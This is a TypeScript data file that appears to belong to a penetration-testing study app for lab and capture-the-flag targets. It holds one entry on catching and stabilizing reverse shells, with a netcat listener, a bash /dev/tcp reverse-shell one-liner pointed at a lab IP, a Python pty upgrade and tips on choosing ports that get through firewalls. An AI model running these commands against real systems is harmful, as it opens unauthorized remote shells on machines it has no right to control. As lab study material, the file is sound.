import { Technique } from "../types";

export const initialAccessTechniques: Technique[] = [
  {
    slug: "reverse-shells",
    section: "b2r",
    category: "initial-access",
    title: "Reverse Shells & Shell Stabilization",
    tags: ["reverse shell", "bind shell", "netcat", "nc", "foothold", "pty", "stabilize", "tty"],
    concept:
      "A reverse shell makes the target connect back to an attacker-controlled listener, bypassing inbound firewall rules. Once caught, the raw shell is usually unstable (no job control, broken arrow keys, dies on Ctrl+C) and must be upgraded to a full TTY for comfortable use.",
    whenToUse: [
      "You have a code-execution primitive (RCE, command injection, upload-to-exec) and need an interactive shell.",
      "Immediately after any exploit that grants arbitrary command execution.",
    ],
    workflow: [
      { label: "Start a listener on your machine", detail: "netcat on a chosen port." },
      { label: "Trigger the payload on the target", detail: "Via the vulnerability (RCE, upload, injection)." },
      { label: "Catch the connection", detail: "Confirm you have a shell as the service user." },
      { label: "Stabilize the TTY", detail: "python pty + stty raw for full terminal features." },
      { label: "Background and treat as a normal shell", detail: "Begin privilege escalation enumeration." },
    ],
    commands: [
      {
        syntax: "nc -lvnp PORT",
        example: "nc -lvnp 4444",
        description: "Starts a netcat listener on your attacking machine, waiting for the target to connect back.",
        flags: [
          { flag: "-l", explanation: "Listen mode." },
          { flag: "-v", explanation: "Verbose — show connection info." },
          { flag: "-n", explanation: "No DNS resolution (faster, avoids hangs)." },
          { flag: "-p PORT", explanation: "Local port to listen on." },
        ],
        whenToUse: "Always start the listener BEFORE triggering the payload.",
        expectedOutput: "listening on [any] 4444 ...\nconnect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 51722",
        lookFor: "A successful 'connect to' line — if nothing appears, the payload didn't fire or is blocked.",
        nextStep: "You now have a shell; proceed to stabilization.",
      },
      {
        syntax: "bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1",
        example: "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        description: "Classic bash reverse-shell one-liner using /dev/tcp (built into bash, no netcat needed on target).",
        flags: [],
        whenToUse: "When the target has bash but no netcat, and you have a way to execute an arbitrary command string.",
        expectedOutput: "Connection appears on your listener; you land in the target's shell.",
        lookFor: "Immediate disconnect usually means the exploit shell lacks /dev/tcp (dash/sh instead of bash) — try a different payload.",
        nextStep: "Stabilize the TTY once connected.",
        altersState: true,
      },
      {
        syntax: "python3 -c \"import pty; pty.spawn('/bin/bash')\"",
        example: "python3 -c \"import pty; pty.spawn('/bin/bash')\"",
        description: "Run inside the raw reverse shell to spawn a proper pseudo-terminal, enabling tab-completion, arrow keys, and Ctrl+C handling.",
        flags: [],
        whenToUse: "Immediately after catching any raw netcat shell.",
        expectedOutput: "Shell prompt reappears, now behaving like a real TTY.",
        lookFor: "Still missing job control fully until you background it and fix terminal settings (next step).",
        nextStep: "Background with Ctrl+Z, then on your own terminal: stty raw -echo; fg; then export TERM=xterm and reset.",
      },
    ],
    tools: [
      {
        name: "Netcat (nc)",
        purpose: "Generic TCP/UDP listener/client; the standard reverse/bind shell catcher.",
        whenToUse: "Default listener for any reverse shell payload.",
        usage: "nc -lvnp PORT",
        exampleWorkflow: "Listener up -> trigger payload -> stabilize caught shell.",
      },
      {
        name: "Pwncat / rlwrap",
        purpose: "Wraps a raw listener with readline support (history, arrow keys) without needing full PTY stabilization.",
        whenToUse: "Quick comfort upgrade when you don't want to run the Python PTY trick.",
        install: "sudo apt install rlwrap",
        usage: "rlwrap nc -lvnp PORT",
        exampleWorkflow: "Start listener wrapped in rlwrap before triggering payload.",
      },
    ],
    findings: {
      interesting: ["Shell running as a service account with useful group memberships (docker, adm, sudo)"],
      suspicious: ["Shell dies instantly after connecting — may indicate a very short-lived process or output buffering issue"],
      howToValidate: ["Run 'id' and 'whoami' immediately to confirm the user context before doing anything else"],
    },
    nextStep: [
      "Run 'id', 'uname -a', 'cat /etc/os-release' to orient yourself.",
      "Move straight into Linux Privilege Escalation enumeration.",
    ],
    troubleshooting: [
      {
        symptom: "Listener never receives a connection.",
        likelyCause: "Wrong IP/port in payload, outbound firewall on target blocking the port, or payload simply didn't execute.",
        verify: "Double-check YOUR_IP is the VPN/tun0 interface IP, not localhost; confirm the triggering request actually returned a success response.",
        fix: "Try a common allowed port (443, 80) instead of an arbitrary high port; confirm with 'ip a' which interface the lab VPN assigned.",
        recovery: "Re-trigger the payload after fixing IP/port; check for syntax errors from shell quoting if the payload came from a URL parameter.",
        avoid: "Always verify your own tun0/VPN IP with 'ip a' before building the payload — using the wrong interface is the most common cause.",
      },
      {
        symptom: "Shell catches, but Ctrl+C kills the whole session instead of the foreground command.",
        likelyCause: "No real PTY — it's a raw pipe, not a terminal.",
        verify: "Run 'tty' — 'not a tty' confirms the raw-shell state.",
        fix: "Run the python3 pty.spawn stabilization sequence.",
        recovery: "If the shell already died, re-catch it and stabilize before running anything risky.",
        avoid: "Stabilize immediately after every catch, before running further commands.",
      },
    ],
  },
];
